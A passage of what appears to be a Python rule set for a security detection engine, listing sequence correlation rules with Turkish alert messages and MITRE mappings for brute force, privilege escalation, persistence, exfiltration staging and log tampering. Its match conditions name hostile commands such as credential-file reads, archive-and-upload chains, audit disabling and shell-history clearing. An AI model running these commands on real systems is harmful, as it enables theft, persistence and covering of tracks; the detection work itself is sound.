            "tags": ["sequence", "identity", "credential-access", "account-lockout", "auth-aftermath"],
        },
        {
            "id":      "SEQ-023",
            "name":    "VPN Failure → Success",
            "severity": "medium",
            "score":   55,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": "vpn_login", "outcome": "failure"},
                {"action": "vpn_login", "outcome": "success"},
            ],
            "message": "VPN başarısız giriş ardından başarılı bağlantı",
            "summary": "Aynı IP için VPN auth başarısızlığı ardından başarı görüldü.",
            "operator_note": "Kaynak IP, provider ve sonrasında gelen privilege/persistence davranışlarını kontrol edin.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
            "tags": ["sequence", "vpn", "credential-access", "fail-success", "remote-access"],
        },
        {
            "id":      "SEQ-024",
            "name":    "SMTP Failure → Success",
            "severity": "medium",
            "score":   50,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": "smtp_login", "outcome": "failure"},
                {"action": "smtp_login", "outcome": "success"},
            ],
            "message": "SMTP auth başarısızlığı ardından başarılı giriş",
            "summary": "SMTP auth başarısızlığını aynı kaynaktan gelen başarılı giriş izledi.",
            "operator_note": "Kaynak IP, sasl kullanıcı adı ve hemen sonraki relay/reject kalıplarını inceleyin.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
            "tags": ["sequence", "mail", "smtp", "credential-access", "fail-success"],
        },
        # SEQ-025 — RESERVED (deleted; the ID must not be reused so existing DB state stays consistent)
        {
            "id":      "SEQ-026",
            "name":    "Identity Policy Denied → Success",
            "severity": "medium",
            "score":   58,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "account_policy", "outcome": "failure"},
                {"action": "identity_login", "outcome": "success"},
            ],
            "message": "Hesap politikası reddi ardından başarılı kimlik doğrulama",
            "summary": "Hesap politikasıyla reddedilen erişimi daha sonra başarılı identity girişi izledi.",
            "operator_note": "Policy değişikliği, grup üyeliği veya hesap durumu güncellemesini doğrulayın.",
            "mitre_tactic": "TA0001",
            "mitre_technique": "T1078",
            "tags": ["sequence", "identity", "policy-deny", "valid-accounts", "auth-aftermath"],
        },
        {
            "id":      "SEQ-027",
            "name":    "OpenVPN Failure → Success → Disconnect",
            "severity": "medium",
            "score":   60,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": "vpn_login", "outcome": "failure", "fields": {"auth_mechanism": "openvpn"}},
                {"action": "vpn_login", "outcome": "success", "fields": {"auth_mechanism": "openvpn"}},
                {"action": "session_close", "outcome": "success", "fields": {"auth_mechanism": "openvpn"}},
            ],
            "message": "OpenVPN başarısız deneme ardından kısa süreli bağlantı ve kopma görüldü",
            "summary": "OpenVPN auth başarısızlığı sonrası kısa ömürlü başarılı bağlantı görüldü.",
            "operator_note": "Kullanıcı/common-name, kaynak IP ve oturum süresini doğrulayın.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
            "tags": ["sequence", "vpn", "openvpn", "credential-access", "short-session"],
        },
        # SEQ-028 — RESERVED (deleted; the ID must not be reused so existing DB state stays consistent)
        {
            "id":      "SEQ-029",
            "name":    "Repeated Firewall Reject",
            "severity": "low",
            "score":   35,
            "timeout": 120,
            "entity_type": "ip",
            "steps": [
                {"action": "firewall_reject", "outcome": "rejected"},
                {"action": "firewall_reject", "outcome": "rejected"},
                {"action": "firewall_reject", "outcome": "rejected"},
            ],
            "message": "Aynı kaynaktan tekrar eden firewall reject olayları",
            "summary": "Aynı kaynak IP kısa aralıkta birden fazla firewall reddi üretti.",
            "operator_note": "Kaynak IP'yi, hedef portları ve kısa süre sonraki başarılı erişim/policy değişikliklerini inceleyin.",
            "mitre_tactic": "TA0043",
            "mitre_technique": "T1595.001",
            "tags": ["sequence", "firewall", "network", "reconnaissance", "reject-burst"],
        },
        # SEQ-030 — RESERVED (deleted; the ID must not be reused so existing DB state stays consistent)
        {
            "id":      "SEQ-031",
            "name":    "Auth/VPN Success → Authorized Keys Persistence",
            "severity": "high",
            "score":   80,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": "sudo",
                    "outcome": "success",
                    "fields": {
                        "sudo_command_contains_any": [
                            "authorized_keys",
                            ".ssh/authorized_keys",
                        ],
                    },
                },
            ],
            "message": "Başarılı giriş ardından authorized_keys yazımı görüldü",
        },
        {
            "id":      "SEQ-032",
            "name":    "Auth/VPN Success → Cron Persistence",
            "severity": "high",
            "score":   78,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": "sudo",
                    "outcome": "success",
                    "fields": {
                        "sudo_command_contains_any": [
                            "crontab -e",
                            "crontab -r",
                            "/etc/cron.d",
                            "/etc/cron.daily",
                            "/etc/cron.hourly",
                            "/etc/cron.weekly",
                            "/etc/crontab",
                            "/var/spool/cron",
                        ],
                    },
                },
            ],
            "message": "Başarılı giriş ardından cron persistence komutu çalıştırıldı",
        },
        {
            "id":      "SEQ-033",
            "name":    "Auth/VPN Success → Systemd Persistence",
            "severity": "high",
            "score":   80,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": "sudo",
                    "outcome": "success",
                    "fields": {
                        "sudo_command_contains_any": [
                            "systemctl enable",
                            "systemctl daemon-reload",
                            "/etc/systemd/system",
                            "/lib/systemd/system",
                            "/usr/lib/systemd",
                        ],
                    },
                },
            ],
            "message": "Başarılı giriş ardından systemd persistence komutu çalıştırıldı",
        },
        {
            "id":      "SEQ-034",
            "name":    "Sudo/Su → Password Change",
            "severity": "high",
            "score":   75,
            "timeout": 300,
            "entity_type": "host",
            "steps": [
                {"action": ["sudo", "su"], "outcome": "success"},
                {"action": "passwd_change", "outcome": "success"},
            ],
            "message": "Yetki yükseltme ardından parola değişikliği görüldü",
        },
        {
            "id":      "SEQ-035",
            "name":    "Auth/VPN Success → Sudoers Change",
            "severity": "high",
            "score":   82,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": "sudo",
                    "outcome": "success",
                    "fields": {
                        "sudo_command_contains_any": [
                            "visudo",
                            "/etc/sudoers",
                            "/etc/sudoers.d",
                        ],
                    },
                },
            ],
            "message": "Başarılı giriş ardından sudoers değişikliği görüldü",
        },
        {
            "id":      "SEQ-036",
            "name":    "VPN Success → Sudo/Su",
            "severity": "high",
            "score":   78,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "vpn_login", "outcome": "success"},
                {"action": ["sudo", "su"], "outcome": "success"},
            ],
            "message": "VPN bağlantısı ardından yetki yükseltme görüldü",
            "summary": "Uzak VPN erişimi sonrasında aynı kullanıcı için hızlı yetki yükseltme görüldü.",
            "operator_note": "Oturum kaynağını, kullanıcı meşruiyetini ve sudo/su komut bağlamını doğrulayın.",
            "mitre_tactic": "TA0004",
            "mitre_technique": "T1548.003",
            "tags": ["sequence", "vpn", "privilege-escalation", "remote-access", "sudo", "su"],
        },
        {
            "id":      "SEQ-037",
            "name":    "SMTP Success → Relay-Denied Reject",
            "severity": "medium",
            "score":   58,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": "smtp_login", "outcome": "success"},
                {
                    "action": "smtp_reject",
                    "outcome": "failure",
                    "fields": {
                        "reject_reason_contains": "Relay access denied",
                    },
                },
            ],
            "message": "SMTP auth başarısı ardından relay-denied reject görüldü",
            "summary": "SMTP kimlik doğrulaması sonrası relay denemesi reddedildi; hesap kötüye kullanımı olabilir.",
            "operator_note": "Kaynak IP, kullanıcı hesabı ve hedef alıcı desenlerini gözden geçirin.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
            "tags": ["sequence", "mail", "smtp", "account-abuse", "relay", "post-auth"],
        },
        {
            "id":      "SEQ-039",
            "name":    "Identity Success → Sudo/Su",
            "severity": "high",
            "score":   76,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "identity_login", "outcome": "success"},
                {"action": ["sudo", "su"], "outcome": "success"},
            ],
            "message": "Kimlik doğrulama başarısı ardından yetki yükseltme görüldü",
            "summary": "Merkezi kimlik doğrulama sonrası aynı kullanıcı kısa sürede sudo/su kullandı.",
            "operator_note": "Identity kaynağını, oturum bağlamını ve sudo/su hedefini doğrulayın.",
            "mitre_tactic": "TA0004",
            "mitre_technique": "T1548.003",
            "tags": ["sequence", "identity", "privilege-escalation", "sudo", "su", "post-auth"],
        },
        {
            "id":      "SEQ-040",
            "name":    "Account Locked → Later Success",
            "severity": "medium",
            "score":   60,
            "timeout": 1800,
            "entity_type": "user",
            "steps": [
                {"action": "account_locked", "outcome": "failure"},
                {"action": "identity_login", "outcome": "success"},
            ],
            "message": "Hesap kilitlenmesi ardından başarılı kimlik doğrulama görüldü",
            "summary": "Kilitlenen hesabın daha sonra başarıyla oturum açması dikkat gerektirir.",
            "operator_note": "Kilit açma nedeni, parola sıfırlama ve kimlik sağlayıcı tarafındaki değişiklikleri kontrol edin.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
            "tags": ["sequence", "identity", "account-lockout", "credential-access", "recovery", "post-lockout"],
        },
        {
            "id":      "SEQ-041",
            "name":    "Repeated Identity Policy Deny → Success",
            "severity": "medium",
            "score":   62,
            "timeout": 1800,
            "entity_type": "user",
            "steps": [
                {"action": "account_policy", "outcome": "failure"},
                {"action": "account_policy", "outcome": "failure"},
                {"action": "identity_login", "outcome": "success"},
            ],
            "message": "Tekrarlayan politika reddi ardından başarılı kimlik doğrulama görüldü",
            "summary": "Art arda politika reddi sonrası erişim sağlandı; hesap/politika durumu değişmiş olabilir.",
            "operator_note": "Hesap durumu, grup üyeliği ve policy değişikliklerini gözden geçirin.",
            "mitre_tactic": "TA0001",
            "mitre_technique": "T1078",
            "tags": ["sequence", "identity", "policy-deny", "valid-accounts", "post-auth"],
        },
        {
            "id":      "SEQ-042",
            "name":    "Firewall Burst → Auth/VPN Success",
            "severity": "medium",
            "score":   58,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": ["firewall_reject", "firewall_block"], "outcome": ["rejected", "blocked"]},
                {"action": ["firewall_reject", "firewall_block"], "outcome": ["rejected", "blocked"]},
                {"action": ["ssh_login", "vpn_login"], "outcome": "success"},
            ],
            "message": "Aynı kaynaktan firewall burst ardından başarılı erişim görüldü",
            "summary": "Aynı kaynak önce firewall tarafından engellendi, ardından başarılı erişim elde etti.",
            "operator_note": "Kaynak IP için ağ yolu değişimi, whitelist ve son başarılı oturum ayrıntılarını inceleyin.",
            "mitre_tactic": "TA0001",
            "mitre_technique": "T1078",
            "tags": ["sequence", "firewall", "valid-accounts", "network", "post-block", "remote-access", "access-abuse"],
        },
        {
            "id":      "SEQ-043",
            "name":    "Identity/VPN Success → Password Change",
            "severity": "high",
            "score":   76,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {"action": "passwd_change", "outcome": "success"},
            ],
            "message": "Uzak/merkezi erişim ardından parola değişikliği görüldü",
            "summary": "SSH, identity veya VPN oturumu sonrası aynı kullanıcı için parola değiştirildi.",
            "operator_note": "Parola değişikliğinin meşru self-service mi yoksa hesap ele geçirme sonrası kalıcılık mı olduğunu doğrulayın.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1098",
            "tags": ["sequence", "persistence", "account-access", "identity", "vpn", "ssh", "password-change"],
        },
        {
            "id":      "SEQ-044",
            "name":    "SSH Success → Sudo/Su",
            "severity": "high",
            "score":   76,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "ssh_login", "outcome": "success"},
                {"action": ["sudo", "su"], "outcome": "success"},
            ],
            "message": "SSH erişimi ardından yetki yükseltme görüldü",
            "summary": "Başarılı SSH oturumunu aynı kullanıcı için hızlı sudo/su izledi.",
            "operator_note": "Kaynak IP, tty ve yükseltme komut bağlamını doğrulayın; persistence veya keşif ile birlikte değerlendirin.",
            "mitre_tactic": "TA0004",
            "mitre_technique": "T1548.003",
            "tags": ["sequence", "ssh", "privilege-escalation", "sudo", "su", "post-auth"],
        },
        {
            "id":      "SEQ-045",
            "name":    "Archive/Staging → Outbound Transfer",
            "severity": "critical",
            "score":   91,
            "timeout": 600,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_token_contains_any": ["tar", "zip", "7z", "gzip", "xz", "split", "base64", "gpg", "openssl"]},
                                    {"command_contains_any": ["openssl enc", "gpg -c", "gpg --symmetric", "7z a", "zip -r", "tar -c", "tar cz", "tar -z"]},
                                ]
                            },
                            {"command_contains_any": ["/tmp/", "/var/tmp/", "/dev/shm/"]},
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {"command_contains_any": ["/tmp/", "/var/tmp/", "/dev/shm/"]},
                            {
                                "__any__": [
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["scp", "sftp", "rsync", "rclone", "curl", "wget"]},
                                            {"command_contains_any": ["@", "://", "rsync://", "s3://", "gs://", "remote:"]},
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["aws"]},
                                            {"command_contains_any": ["aws s3 cp", " s3://"]},
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["nc", "ncat"]},
                                            {"__not__": {"command_contains_any": [" -l", " --listen", " -k -l", " -lv"]}},
                                        ]
                                    },
                                ]
                            },
                        ]
                    },
                },
            ],
            "message": "Arşivleme/staging ardından dışa transfer görüldü",
            "summary": "Hassas içerik önce temp path altında paketlendi veya stage edildi, ardından dışa taşıma komutu görüldü.",
            "operator_note": "Temp dosya yolunu, hedef uzak adresi ve komutun backup/operasyon bağlamı olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0010",
            "mitre_technique": "T1041",
            "tags": ["sequence", "archive", "staging", "exfiltration", "temp-path", "outbound-transfer"],
        },
        {
            "id":      "SEQ-046",
            "name":    "Login Success → Discovery → Abuse",
            "severity": "critical",
            "score":   86,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                                    {"command_contains_any": ["sudo -l", "sudo --list", "doas -L", "getent group sudo", "getent group wheel", "getent group admin", "grep sudo /etc/group", "grep wheel /etc/group", "cat /etc/sudoers", "cat /etc/sudoers.d", "ls /etc/sudoers.d", "cat /etc/doas.conf"]},
                                    {"command_contains_any": ["find / -name id_rsa", "find / -name id_ed25519", "find /etc -name *.pem", "find /etc -name *.key"]},
                                    {"command_contains_any": ["find / -name kubeconfig", "find /var/lib/kubelet", "ss -tulpn", "netstat -tulpn", "ip neigh", "arp -a", "grep COMMAND= /var/log/auth.log", "grep COMMAND= /var/log/secure", "journalctl -u ssh ", "journalctl -u sshd ", "dpkg -l sudo", "rpm -q sudo", "zypper search -i sudo"]},
                        ]
                    },
                },
                {
                    "action": ["sudo", "su", "exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_target_user": "root"},
                                    {"su_target": "root"},
                                    {"sudo_command_contains_any": ["sudo su", "sudo su -", "sudo -i", "pkexec", "doas ", "doas -s", "doas su -", "passwd root", "chpasswd", "visudo -f /etc/sudoers", "visudo -f /etc/sudoers.d", "usermod -aG sudo", "usermod -aG wheel", "gpasswd -a"]},
                                    {"command_contains_any": ["sudo su", "sudo su -", "sudo -i", "su -", "pkexec", "/usr/bin/pkexec", "doas ", "doas -s", "doas su -", "doas /bin/sh", "doas /bin/bash", "passwd root", "chpasswd", "visudo -f /etc/sudoers", "visudo -f /etc/sudoers.d"]},
                                    {"command_regex": r'(?:^|\s)(?:usermod\s+(?:-[^\n;]*\s+)*-aG\s+(?:sudo|wheel|adm|admin)\b|gpasswd\s+-a\s+\S+\s+(?:sudo|wheel|adm|admin)\b)'},
                                    {"command_contains_any": [".env", ".pgpass", ".my.cnf", "wp-config.php", ".kube/config", "docker/config.json", ".aws/credentials", "/run/secrets/", "/var/run/secrets/", "/etc/secrets/", "/etc/apt/auth.conf", "/etc/apt/auth.conf.d/", "/etc/apt/auth.conf.d", "/etc/rhsm/rhsm.conf", "/etc/zypp/credentials.d/", "/etc/zypp/credentials.d"]},
                                    {"command_contains_any": ["tar cz", "tar -c", "zip -r", "gpg -c", "gpg --symmetric", "openssl enc", "/tmp/", "/var/tmp/", "/dev/shm/"]},
                                    {"command_contains_any": ["authorized_keys", "/etc/cron", "/etc/systemd/system", "/etc/sudoers", "/etc/sudoers.d"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "cloud-init", "dnf config-manager", "subscription-manager", "SUSEConnect", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim sonrası discovery ve kötüye kullanım zinciri görüldü",
            "summary": "SSH/VPN/identity başarısı kısa sürede discovery ile takip edildi ve ardından yetki yükseltme, secret erişimi, staging veya persistence görüldü.",
            "operator_note": "Kullanıcı oturumunu, discovery komutunun bağlamını ve takip eden sudo/secret/persistence adımının meşru yönetim işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0007",
            "mitre_technique": "T1083",
            "tags": ["sequence", "post-auth", "discovery", "privilege-escalation", "credential-access", "persistence"],
        },
        {
            "id":      "SEQ-047",
            "name":    "Persistence Create → Enable/Start",
            "severity": "high",
            "score":   80,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["service_created", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"service_path_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".timer", ".service"]},
                                    {"command_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".service.d", "override.conf", "ExecStart=", "ExecReload=", "Environment=", ".timer", ".service", "/etc/default/", "/etc/sysconfig/", "/etc/init.d/", "/etc/rc.d/init.d/", "/etc/rc.local", "/etc/cron", "/var/spool/cron", "authorized_keys"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "unattended-upgrades", "cloud-init", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload"]},
                                        {"service_path_contains_any": ["apt-daily", "apt-daily-upgrade", "fstrim.timer", "logrotate.timer", "man-db.timer", "motd-news"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_command_contains_any": ["systemctl enable", "systemctl start", "systemctl daemon-reload"]},
                                    {"command_contains_any": ["systemctl enable", "systemctl start", "systemctl restart", "systemctl reload", "systemctl --user enable", "systemctl --user start", "systemctl daemon-reload", "service ", "invoke-rc.d ", "update-rc.d ", "chkconfig ", "insserv ", "rc-update ", "loginctl enable-linger"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion"]},
                                        {"command_contains_any": ["systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload", "needrestart", "unattended-upgrades", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Persistence dosyası/servisi oluşturuldu ve etkinleştirildi",
            "summary": "Yeni unit veya kalıcılık dosyası oluşturulmasını kısa süre içinde enable/start davranışı izledi.",
            "operator_note": "Oluşturulan yolun benign paket kurulumu mu yoksa kalıcılık mı olduğunu, unit içeriğini ve tetikleyici oturumu kontrol edin.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1543.002",
            "tags": ["sequence", "persistence", "systemd", "timer", "service", "enable-start"],
        },
        {
            "id":      "SEQ-048",
            "name":    "Login Success → Persistence",
            "severity": "critical",
            "score":   78,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec", "service_created"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/etc/systemd/system", "/etc/sudoers", "/etc/ssh/sshd_config", "/etc/profile", "/etc/profile.d"]},
                                    {"command_contains_any": ["authorized_keys", ".config/systemd/user", "/etc/cron", "/etc/crontab", "/var/spool/cron", "/etc/systemd/system", ".timer", ".service", "/etc/sudoers", "/etc/ssh/sshd_config", ".bashrc", ".profile", ".zshrc", "/etc/profile"]},
                                    {"service_path_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".timer", ".service"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion"]},
                                        {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "unattended-upgrades", "cloud-init", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim ardından persistence davranışı görüldü",
            "summary": "SSH/VPN/identity başarısından kısa süre sonra kalıcılık dosyası, unit veya config değişikliği görüldü.",
            "operator_note": "Oturum kaynağını, kullanıcı meşruiyetini ve persistence değişikliğinin planlı kurulum işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1543.002",
            "tags": ["sequence", "persistence", "post-auth", "systemd", "cron", "authorized-keys"],
        },
        {
            "id":      "SEQ-049",
            "name":    "Audit/Logging Disable → Log Clear",
            "severity": "critical",
            "score":   91,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                            {"command_contains_any": ["systemctl stop auditd", "systemctl disable auditd", "systemctl mask auditd", "service auditd stop", "kill -STOP", "kill -SIGSTOP", "pkill -STOP", "pkill -SIGSTOP", "killall -STOP", "killall -SIGSTOP", "systemctl stop rsyslog", "systemctl disable rsyslog", "systemctl stop systemd-journald", "systemctl disable systemd-journald", "auditctl -D", "auditctl -e 0"]},
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                            {"command_contains_any": ["truncate -s 0 /var/log/", "rm -f /var/log/", "shred /var/log/", "dd if=/dev/null of=/var/log/", "journalctl --vacuum-time", "journalctl --vacuum-size", "journalctl --vacuum-files", "rm -rf /var/log/journal", "history -c", "unset HISTFILE", ".bash_history"]},
                        ]
                    },
                },
            ],
            "message": "Audit/log servisleri devre dışı bırakıldıktan sonra log temizleme görüldü",
            "summary": "Önce denetim/logging zayıflatıldı, ardından log veya shell geçmişi temizleme davranışı görüldü.",
            "operator_note": "Bakım işi değilse erişim sonrası iz silme olasılığı yüksektir; aynı hostta sonraki persistence/exfil aktivitelerini kontrol edin.",
            "mitre_tactic": "TA0005",
            "mitre_technique": "T1070.002",
            "tags": ["sequence", "defense-evasion", "log-tampering", "audit-disable", "history-clear"],
        },
        {
            "id":      "SEQ-050",
            "name":    "Login Success → Log Tamper",
            "severity": "high",
            "score":   78,
            "timeout": 420,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["systemctl stop auditd", "systemctl disable auditd", "systemctl mask auditd", "service auditd stop", "kill -STOP", "kill -SIGSTOP", "pkill -STOP", "pkill -SIGSTOP", "killall -STOP", "killall -SIGSTOP", "systemctl stop rsyslog", "systemctl stop systemd-journald", "auditctl -D", "auditctl -e 0"]},
                                    {"command_contains_any": ["truncate -s 0 /var/log/", "rm -f /var/log/", "shred /var/log/", "journalctl --vacuum-time", "journalctl --vacuum-size", "rm -rf /var/log/journal", "history -c", "unset HISTFILE", ".bash_history"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["systemctl restart auditd", "systemctl reload auditd", "service auditd restart", "service auditd reload", "logrotate", "systemctl restart rsyslog", "systemctl restart systemd-journald", "systemctl reload rsyslog", "journalctl --rotate", "journalctl --sync", "tmpfiles --clean", "apt", "apt-get", "dpkg", "rpm", "dnf", "yum", "zypper", "packagekit", "needrestart", "unattended-upgrades", "cloud-init", "subscription-manager", "SUSEConnect", "transactional-update", "chef-client", "puppet", "ansible", "ansible-playbook", "salt-call", "salt-minion"]},
                                        {"command_token_contains_any": ["logrotate", "apt", "dpkg", "rpm", "dnf", "yum", "zypper"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim ardından log tamper davranışı görüldü",
            "summary": "SSH/VPN/identity başarısından kısa süre sonra audit/log temizleme veya history silme görüldü.",
            "operator_note": "Başarılı erişimin meşruiyetini, sudo bağlamını ve hemen önceki/sonraki kalıcılık veya veri dışa taşıma sinyallerini inceleyin.",
            "mitre_tactic": "TA0005",
            "mitre_technique": "T1070.002",
            "tags": ["sequence", "post-auth", "defense-evasion", "log-tampering", "audit-disable"],
        },
        {
            "id":      "SEQ-051",
            "name":    "Tool Install → Suspicious Tool Exec",
            "severity": "high",
            "score":   76,
            "timeout": 900,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["pkg_install", "attack_tool_installed"],
                    "fields": {
                        "__any__": [
                            {"package_contains_any": ["nmap", "netcat", "netcat-openbsd", "netcat-traditional", "ncat", "nmap-ncat", "socat", "tcpdump", "hydra", "john", "curl", "wget", "awscli", "aws-cli", "python3-awscli", "rclone", "sshpass", "tmux", "screen"]},
                            {"tool_contains_any": ["nmap", "netcat", "netcat-openbsd", "netcat-traditional", "ncat", "nmap-ncat", "socat", "tcpdump", "hydra", "john", "curl", "wget", "awscli", "aws-cli", "python3-awscli", "rclone", "sshpass", "tmux", "screen"]},
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                            {"attack_contains_any": ["nmap_scan", "brute_force_tool", "packet_capture", "curl_pipe", "wget_pipe", "socat_reverse_shell"]},
                            {"command_token_contains_any": ["nmap", "nc", "netcat", "ncat", "socat", "tcpdump", "hydra", "john", "curl", "wget", "rclone", "sshpass"]},
                            {"__all__": [{"command_token_contains_any": ["aws"]}, {"command_contains_any": ["aws s3 cp", " s3://"]}]},
                            {"command_contains_any": ["tmux new", "tmux new-session", "screen -dm", "screen -S"]},
                        ],
                        "__not__": {
                            "__any__": [
                                {"command_token_contains_any": ["apt", "apt-get", "dpkg", "dnf", "yum", "rpm", "zypper"]},
                                {"command_contains_any": ["apt upgrade", "apt-get upgrade", "apt-get dist-upgrade", "dnf upgrade", "yum update", "zypper update", "packagekit", "unattended-upgrades", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/health", "/healthz", "/readyz", "/livez", "aws configure", "aws s3 sync", "--profile admin", "--profile ops", "backup", "restore"]},
                                {"command_token_contains_any": ["healthcheck"]},
                            ]
                        },
                    },
                },
            ],
            "message": "Şüpheli araç kurulduktan kısa süre sonra çalıştırıldı",
            "summary": "Package manager ile kurulan şüpheli araç kısa süre içinde process loglarında yürütüldü.",
            "operator_note": "Kurulumun değişiklik penceresiyle ilişkisini, aracın ilk komutunu ve aynı hosttaki discovery/exfil zincirlerini doğrulayın.",
            "mitre_tactic": "TA0002",
            "mitre_technique": "T1072",
            "tags": ["sequence", "execution", "package-manager", "tooling", "post-install"],
        },
        {
            "id":      "SEQ-052",
            "name":    "Web Exploit/Upload → Process Abuse",
            "severity": "critical",
            "score":   89,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["shell_upload", "path_traversal", "sqli_attempt", "http_request"],
                    "source": ["apache2", "nginx"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"attack_contains_any": ["shell_upload", "path_traversal", "sql_injection"]},
